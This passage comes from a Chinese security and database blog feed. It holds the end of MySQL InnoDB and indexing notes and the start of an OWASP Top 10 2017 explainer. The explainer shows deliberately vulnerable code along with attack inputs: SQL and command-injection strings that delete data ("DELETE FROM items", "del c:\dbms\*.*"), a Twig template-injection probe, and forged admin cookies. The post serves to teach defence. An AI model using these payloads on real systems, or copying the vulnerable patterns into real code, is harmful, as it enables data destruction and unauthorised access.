title="Change Buffer"></a>Change Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-change-buffer.html">插入缓冲</a></p><p>插入缓冲针对的操作是更新或者插入，我们考虑最坏的情况，那就是需要更新的数据都不在缓冲池中。那么此时等数据达到某个阈值（例如50条）才批量的写入磁盘</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-change-buffer.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffering"><code>innodb_change_buffering</code></a> 变量控制<code>InnoDB</code> 执行更改缓冲的程度，默认值为all。</p><ul><li><p><strong><code>all</code></strong></p><p>默认值：缓冲区插入，删除标记操作和清除。</p></li><li><p><strong><code>none</code></strong></p><p>不要缓冲任何操作。</p></li><li><p><strong><code>inserts</code></strong></p><p>缓冲区插入操作。</p></li><li><p><strong><code>deletes</code></strong></p><p>缓冲区删除标记操作。</p></li><li><p><strong><code>changes</code></strong></p><p>缓冲插入和删除标记操作。</p></li><li><p><strong><code>purges</code></strong></p><p>缓冲在后台发生的物理删除操作。</p></li></ul><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffer_max_size"><code>innodb_change_buffer_max_size</code></a> 变量允许将更改缓冲区的最大大小配置为缓冲池总大小的百分比。默认情况下， <code>innodb_change_buffer_max_size</code>设置为25。最大设置为50。</p><h4 id="Log-Buffer"><a href="#Log-Buffer" class="headerlink" title="Log Buffer"></a>Log Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log-buffer.html">日志缓冲</a></p><p>日志缓冲区是存储区域，用于保存要写入磁盘上的日志文件的数据。日志缓冲区大小由<a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_log_buffer_size"><code>innodb_log_buffer_size</code></a>变量定义 。默认大小为16MB。日志缓冲区的内容会定期刷新到磁盘。较大的日志缓冲区使大型事务可以运行，而无需在事务提交之前将重做日志数据写入磁盘。因此，如果有更新，插入或删除许多行的事务，则增加日志缓冲区的大小可以节省磁盘I/O。</p><h4 id="Adaptive-Hash-Index"><a href="#Adaptive-Hash-Index" class="headerlink" title="Adaptive Hash Index"></a>Adaptive Hash Index</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-adaptive-hash.html">自适应哈希索引</a></p><p>自适应索引就跟JVM在运行过程中，会动态的把某些热点代码编译成Machine Code一样，InnoDB会监控对所有索引的查询，对热点访问的页建立哈希索引，以此来提升访问速度。</p><h4 id="Doublewrite-Buffer"><a href="#Doublewrite-Buffer" class="headerlink" title="Doublewrite Buffer"></a>Doublewrite Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-doublewrite-buffer.html">双写缓冲区</a></p><p><strong>插入缓冲</strong>提高了MySQL的性能，而<strong>两次写</strong>则在此基础上提高了数据的可靠性。当数据还在缓冲池中的时候，当机器宕机了，发生了<strong>写失效</strong>，有Redo Log来进行恢复。但是如果是在从缓冲池中将数据刷回磁盘的时候宕机了呢？</p><p>这种情况叫做部分写失效，此时重做日志就无法解决问题。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409163524052.png" alt loading="lazy"></p><p>在刷脏页时，并不是直接刷入磁盘，而是copy到内存中的Doublewrite Buffer中，然后再拷贝至磁盘共享表空间（你可以就理解为磁盘）中，每次写入1M，等copy完成后，再将Doublewrite Buffer中的页写入磁盘文件。</p><p>有了两次写机制，即使在刷脏页时宕机了，在实例恢复的时候也可以从共享表空间中找到Doublewrite Buffer的页副本，直接将其覆盖原来的数据页即可。</p><p>尽管数据被写入两次，但双写缓冲区不需要两倍的I / O开销或两倍的I / O操作。只需一次<code>fsync()</code>调用操作系统即可将数据按较大的顺序块写入doublewrite缓冲区（除非 <code>innodb_flush_method</code>设置为 <code>O_DIRECT_NO_FSYNC</code>）。</p><p>在MySQL 8.0.20之前，doublewrite缓冲区存储区位于<code>InnoDB</code>系统表空间中。从MySQL 8.0.20开始，doublewrite缓冲区存储区位于doublewrite文件中。</p><h4 id="Redo-Log"><a href="#Redo-Log" class="headerlink" title="Redo Log"></a>Redo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log.html">重做日志</a></p><p>用于记录事务操作的变化，且记录的是修改之后的值。</p><p>不管事务是否提交都会记录下来。例如在更新数据时，会先将更新的记录写到Redo Log中，再更新缓存中页中的数据。然后按照设置的更新策略，将内存中的数据刷回磁盘。</p><h4 id="Undo-Log"><a href="#Undo-Log" class="headerlink" title="Undo Log"></a>Undo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-undo-logs.html">撤消日志</a></p><p>记录事务开始之前的一个版本，可用于事务失败之后发生的回滚。</p><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。</p><p>拿汉语字典的目录页（索引）打比方，我们可以按拼音、笔画、偏旁部首等排序的目录（索引）快速查找到需要的字。</p><p>创建索引时，你需要确保该索引是应用在 SQL 查询语句的条件(一般作为 WHERE 子句的条件)。</p><p>实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。</p><p>过多的使用索引将会造成滥用。因此索引也会有它的缺点：虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。建立索引会占用磁盘空间的索引文件。</p><p>索引分为：</p><ol><li><p>主键索引</p><p>primary key() 要求关键字不能重复，也不能为null,同时增加主键约束</p><p>主键索引定义时，不能命名</p></li><li><p>唯一索引</p><p>unique index() 要求关键字不能重复，同时增加唯一约束</p></li><li><p>普通索引</p><p>index() 对关键字没有要求</p></li><li><p>全文索引</p><p>fulltext key() 关键字的来源不是所有字段的数据，而是字段中提取的特别关键字</p></li></ol><p>先了解一下索引的数据结构 B-Tree（MySQL主要使用 B-tree 平衡树）</p><h4 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h4><p>B树也称B-树,它是一颗多路平衡查找树。大致结构如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410153354423.png" alt loading="lazy"></p><p>B树的阶为节点的最多的子节点数</p><p>B数的搜索方式从根节点开始，对节点内的关键字（有序）序列进行二分查找，如果命中则结束，否则进入查询关键字所属范围的儿子节点，叶子节点和非叶子节点都存放数据，搜索有可能在非叶子节点结束。</p><h4 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h4><p>B+ 树是 B 树的变体，也是一种多路搜索树。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410154531450.png" alt loading="lazy"></p><p>B+树只有到达叶子节点才命中，即所有关键字都出现在叶子节点链表中</p><ul><li>数据只能在叶子节点，也叫 <strong>稠密索引</strong>，且链表中的关键字（数据）恰好是有序的。</li></ul><p>非叶子节点相当于是叶子节点的索引，也叫 <strong>稀疏索引</strong>，叶子节点相当于是存储（关键字）数据的数据层</p><p>B+数对于B数的优势</p><ul><li>单一节点存储的元素多，使得查询的IO次数更少，适合做MySQL的底层数据结构</li><li>所有查询都要查到叶子节点，查询性能稳定</li><li>所有叶子节点形成一个有序的链表，便于查找</li></ul><h4 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h4><p>只有精确匹配索引所有列的查询才有效。每行数据存储引擎都会对所有的索引列计算一个哈希码，哈希索引将哈希码存储在索引中，同时在哈希表中保存指向每个数据行的指针。因为索引自身只存储对应的哈希值，所以索引的结构十分紧凑，哈希索引查找的速度非常快。但是</p><ul><li>不按照索引顺序存储，无法用于排序</li><li>不支持部分索引查找匹配</li><li>不支持范围查找</li></ul><h4 id="聚集索引"><a href="#聚集索引" class="headerlink" title="聚集索引"></a>聚集索引</h4><p>由B+树实现，一个表只能有一个聚集索引，InnoDB表中聚集索引的索引列就是主键，所以聚集索引也叫主键索引。如下表：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> Student<span class="token punctuation">(</span>    id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    last_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>     first_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>     birthday <span class="token keyword">date</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>聚集索引的结构如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410161154845.png" alt loading="lazy"></p><blockquote><p>聚簇索引：索引的叶节点指向数据</p><p>非聚簇索引：索引的叶节点指向数据的引用</p><p>myisam使用非聚簇索引，innodb使用聚簇索引</p></blockquote><h4 id="二级索引"><a href="#二级索引" class="headerlink" title="二级索引"></a>二级索引</h4><p>对于InnoDB表，在非主键列的其他列上建的索引就是二级索引（因为聚集索引只有一个）。</p><p>在MySQL中主键索引的叶子节点存的是整行数据，而二级索引叶子节点内容是主键的值。</p><p>详见：<a href="http://mysql.taobao.org/monthly/2020/01/01/">MySQL · 引擎特性 · 二级索引分析</a></p><h3 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h3><ul><li><p>尽量保证全值匹配，即索引字段和select字段相同且顺序一致</p></li><li><p>最佳左前缀法则：如果索引多列，则查询要从索引的最左列开始，且中间不跳过索引中的列</p></li><li><p>不在索引列上做任何操作(计算、函数、类型转换、不要出现隐式转)，会导致索引失效而全表扫描</p><pre class="language-sql" data-language="sql"><code class="language-sql">假设目标行 name <span class="token operator">=</span> <span class="token string">'july'</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> name<span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>           <span class="token comment">## 走索引 </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> <span class="token keyword">left</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>   <span class="token comment">## 不走索引</span></code></pre></li><li><p>一旦出现非等值字段条件判断，则该字段后的索引列皆失效</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 全索引  a_b_c  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">></span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 部分索引 a_b  </span><span class="token comment">## 非等值条件包括：in &lt; > != like 等  </span><span class="token comment">## 注意：当like 'aaa%' 通配符在右时，仍然能够走全索引  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'100%'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 全索引  a_b_c  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'%100'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 部分索引 a</span></code></pre></li><li><p>尽量使用覆盖索引，即查询列为索引列的子集，减少select * 的使用</p></li><li><p>MySQL在使用不等于(!=或者&lt;&gt;)时无法使用索引，会导致全表扫描</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token comment">## 走索引  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">!=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment">## 不走索引，全表扫描</span></code></pre></li><li><p>查询条件为 is NULL 和 is not NULL情况时也无法使用索引</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token boolean">null</span><span class="token punctuation">;</span>      <span class="token comment">## 不走索引  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">;</span>  <span class="token comment">## 不走索引 </span></code></pre></li><li><p>like以通配符开头<code>(&#39;%abc...&#39;)</code>时索引也会失效，变为全表扫描；但通配符结尾依然会走索引，该字段后的索引依然失效</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"%aaa"</span><span class="token punctuation">;</span>  <span class="token comment">## 索引失效  </span><span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"aaa%"</span><span class="token punctuation">;</span>  <span class="token comment">## 索引有效  </span><span class="token comment">## 当业务要求必须使用左通配符时，可使用覆盖索引的方法来避免索引失效  </span><span class="token comment">## 在上面例子中即建立联合索引 name_age</span></code></pre></li><li><p>字符串不加单引号会导致索引失效   原因：隐式转换</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## id为varchar类型  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'2000'</span><span class="token punctuation">;</span>  <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">;</span>  <span class="token comment">## 会有隐式类型转换</span></code></pre></li><li><p>尽量少用or，用它来连接查询条件可能会导致索引失效</p></li><li><p>group by基本上都需要进行排序，当group by的字段顺序和索引顺序不一致的时候，就会导致临时表的产生，即同时出现 Using temporary 和 Using filesort，因此一定要极力避免</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## 索引为 A_B_C  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> A<span class="token operator">=</span><span class="token number">10</span> <span class="token keyword">group</span> <span class="token keyword">by</span> C<span class="token punctuation">,</span> B<span class="token punctuation">;</span>  <span class="token comment">## 走索引A，产生临时表</span></code></pre></li></ul><p><strong>小结</strong></p><ul><li>对于单值索引，尽量选择针对当前查询过滤性更好的索引字段</li><li>在选择联合索引时，当前查询中过滤性最好的字段在索引字段顺序中位置越靠前越好</li><li>在选择联合索引时，尽可能选择可以包含当前查询的where子句中更多字段的索引，即如果可能的话，尽量达到索引覆盖，这样不仅能够避免索引失效，也能够避免回表等影响查询性能等操作</li><li>尽可能通过分析统计信息和调整查询语句的写法来达到适应选择的索引</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html">The InnoDB Storage Engine</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/storage-engines.html">Alternative Storage Engines</a></li><li><a href="https://github.com/jaywcjlove/mysql-tutorial/blob/master/chapter3/3.5.md">数据库存储引擎</a></li><li><a href="https://juejin.cn/post/6854573221627297800">简单了解InnoDB底层原理</a></li><li><a href="https://zq99299.github.io/dsalg-tutorial/dsalg-java-hsp/12/03.html#b-%E6%A0%91">B 树、B+ 树、B*树</a></li><li><a href="https://segmentfault.com/a/1190000021488885">为什么mysql索引要使用B+树，而不是B树，红黑树</a></li><li><a href="https://juejin.cn/post/6844903919525740552">MySQL索引的原理，B+树、聚集索引和二级索引的结构分析</a></li><li><a href="https://segmentfault.com/a/1190000023441683">MySQL优化之索引优化</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;MySQL存储引擎&quot;&gt;&lt;a href=&quot;#MySQL存储引擎&quot; class=&quot;headerlink&quot; title=&quot;MySQL存储引擎&quot;&gt;&lt;/a&gt;MySQL存储引擎&lt;/h3&gt;&lt;p&gt;存储引擎是MySQL组件，用于处理不同类型的SQL操作。&lt;/p&gt;
&lt;p&gt;使用 &lt;a 
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="SQL" scheme="https://www.extrader.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Owasp_Top_10</title>
    <link href="https://www.extrader.top/posts/db657c/"/>
    <id>https://www.extrader.top/posts/db657c/</id>
    <published>2021-01-30T02:49:21.000Z</published>
    <updated>2021-01-30T10:00:35.063Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://owasp.org/">Owasp</a> 全称 Open Web Application Security Project（开放式Web应用程序安全项目）。</p><p>其中最具权威的就是其”十大安全漏洞列表”，目前正式发布的最新版本是2017年11月份发布的。</p><p>以下对2017年的Top 10版本做一个归纳，例子中不全的欢迎各位大佬评论指出，后续有会添加上。</p><span id="more"></span><h3 id="注入（Injection）"><a href="#注入（Injection）" class="headerlink" title="注入（Injection）"></a>注入（Injection）</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>当不可信的数据作为命令或查询语句的一部分被发送给解释器的时候，会发生注入漏洞，包括SQL、NoSQL、OS以及LDAP注入等。攻击者发送的恶意数据可能会诱使解释器执行计划外的命令，或在没有适当授权的情况下访问数据。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><pre class="language-c#" data-language="c#"><code class="language-c#">string userName &#x3D; ctx.getAuthenticatedUserName();string query &#x3D; &quot;SELECT * FROM items WHERE owner &#x3D; &#39;&quot; + userName + &quot;&#39; AND itemname &#x3D; &#39;&quot; + ItemName.Text + &quot;&#39;&quot;;sda &#x3D; new SqlDataAdapter(query, conn);DataTable dt &#x3D; new DataTable();sda.Fill(dt);</code></pre><p>改代码准备执行的查询如下：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token operator">&lt;</span>userName<span class="token operator">></span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token operator">&lt;</span>itemName<span class="token operator">></span><span class="token punctuation">;</span></code></pre><p>但是查询是通过固定的查询字符和用户的输入字符串连接来动态构成的，若攻击者在<code>owner</code>处构造<code>name&#39;; DELETE FROM items; --</code>，则SQL语句变成了</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token string">'wiley'</span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token string">'name'</span><span class="token punctuation">;</span> <span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> items<span class="token punctuation">;</span> <span class="token comment">--'</span></code></pre><p>参考：<a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></p><p>本站案例：<a href="https://www.extrader.top/posts/e73517db/">CTF-SQL注入</a>，<a href="https://www.extrader.top/posts/e5cd0178/">Sqli-labs靶场</a></p><h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> btype <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"backuptype"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /K \" c:\\util\\rmanDB.bat "</span> <span class="token operator">+</span> btype <span class="token operator">+</span> <span class="token string">"&amp;&amp;c:\\utl\\cleanup.bat\""</span><span class="token punctuation">)</span><span class="token class-name">System<span class="token punctuation">.</span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>以上代码来自一个管理web的应用程序，改程序旨在允许用户使用批处理文件程序来对Oracle数据库进行备份，然后运行<code>cleanup.bat</code>脚本删除一些临时文件，备份脚本<code>rmanDB.bat</code>接收单个命令参数，该参数指定要执行的备份类型，由于对数据库的访问受到限制，因此该备份脚本通常是以特权用户身份运行的</p><p>通常<code>Runtime.exec()</code>函数不会执行多个命令，但是在这种情况下，程序首先运行<code>cmd.exe shell</code>，以便通过一次调用<code>Runtime.exec()</code>来运行多个命令。调用完<code>rmanDB</code>后，接着调用由<code>&amp;&amp;</code>分隔的多个命令。若攻击者传入的字符串形式为<code>&amp; del c:\\dbms\\*.*</code>，那么该应用程序将执行此命令以及攻击者传入的其它命令 <code>del</code></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//example.com/app/accountView?backuptype=&amp; del c:\\dbms\\*.*</code></pre><p>参考：<a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></p><p>本站案例：<a href="https://www.extrader.top/posts/c714e372/">CTF-命令执行</a>，<a href="https://www.extrader.top/posts/45c7e77/">php命令执行小技巧</a></p><h5 id="服务器端模板注入（SSTI）"><a href="#服务器端模板注入（SSTI）" class="headerlink" title="服务器端模板注入（SSTI）"></a>服务器端模板注入（SSTI）</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../lib/Twig/Autoloader.php'</span><span class="token punctuation">;</span><span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将用户输入作为模版内容的一部分</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span></span></code></pre><p>该段代码使得用户可以在发送电子邮件之前自定义使用的名称，但是若攻击者不将静态值传递到模板中，而是使用GET参数动态生成模板本身的一部分name，如下所示</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//vulnerable-website.com/?name=IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</code></pre><p>由于 <code>&#123;# comment #&#125;</code> 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 <code>&#123;&#123;2*8&#125;&#125;</code> 作为模板变量最终会返回 16 作为其值进行显示，因此前端最终会返回内容 <code>Hello IsVuln16OK</code></p><p>参考：<a href="https://portswigger.net/kb/issues/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a>，<a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/">服务端模板注入攻击 (SSTI) 之浅析</a></p><p>本站案例：<a href="https://www.extrader.top/posts/47d18edd/">CTF-SSTI</a></p><h4 id="Prevent"><a href="#Prevent" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>使用安全的API</li><li>使用“白名单”对服务器端的输入进行验证</li><li>使用特定的转义语法来转义特殊字</li><li>在查询中使用LIMIT和其他SQL控件，防止SQL注入的情况下大量泄露记录</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">A1:2017-Injection</a></p><h3 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>通过不规范的使用应用程序的身份认证和会话管理功能，从而使攻击者能够破译密码，密钥或会话令牌，或者暂时或永久的冒充其它用户的身份</p><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> $<span class="token string">q = new CGI;if ($q->cookie('loggedin') ne "true") &#123;    if (! AuthenticateUser($q->param('username'), $q->param('password'))) &#123;    ExitError("Error: you need to log in first");    &#125;else &#123;        # Set loggedin and user cookies.        $q->cookie(        -name =</span><span class="token operator">></span> <span class="token string">'loggedin'</span><span class="token punctuation">,</span>        <span class="token operator">-</span>value <span class="token operator">=></span> <span class="token string">'true'</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token string">q->cookie(        -</span>name <span class="token operator">=></span> <span class="token string">'user'</span><span class="token punctuation">,</span>        <span class="token operator">-</span>value <span class="token operator">=></span> $<span class="token string">q->param('username')        );    &#125;&#125;if ($q-</span><span class="token operator">></span>cookie<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span> <span class="token operator">eq</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>DoAdministratorTasks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>以上代码旨在确保用户已经登录，如果未登录，则代码将使用用户提供的用户名和密码进行身份验证，如果成功，它将登录用户并将用户的cookie设置为“记住”用户已经登录，最后，如果登录的用户的cookie中具有“管理员”用户名，则代码将执行管理员任务。</p><p>然而，这段代码是可以绕过的，攻击者可以独立设置cookie，使得代码不会检查用户名和密码，并且还可以伪造“管理员”身份进行操作，伪造的request头如下：</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/cgi-bin/vulnerable.cgi</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Cookie:</span> user=Administrator<span class="token header-name keyword">Cookie:</span> loggedin=true</code></pre><p>通过将登录的cookie loggedin设置为“true”，攻击者将绕过整个身份认证；通过使cookie user为“Administrator”值，从而获得管理员权限</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></p><h4 id="Prevent-1"><a href="#Prevent-1" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>实施多因素身份认证，以防止自动进行凭据填充，暴力破解和凭据重用攻击</li><li>不适用默认密码，弱密码，尤其是对于管理员用户</li><li>实施密码检测，限制密码长度，复杂性</li><li>限制登录失败次数，频繁的登录尝试，记录故障，并在检测到攻击时提醒管理员</li><li>适用服务器端安全的内置会话管理器</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">A2:2017-Broken Authentication</a></p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>我们的敏感信息包括密码、财务数据、医疗数据等，由于web应用或者API未加密或不正确的保护敏感数据，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" 